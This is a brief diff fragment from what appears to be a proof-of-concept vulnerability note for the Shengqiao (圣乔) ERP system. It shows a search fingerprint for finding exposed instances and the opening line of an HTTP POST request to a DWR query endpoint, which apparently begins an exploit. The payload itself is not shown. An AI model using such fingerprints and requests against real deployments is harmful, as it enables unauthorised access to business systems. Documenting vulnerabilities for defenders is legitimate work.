@@ -8,7 +8,7 @@
 title="圣乔ERP系统"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
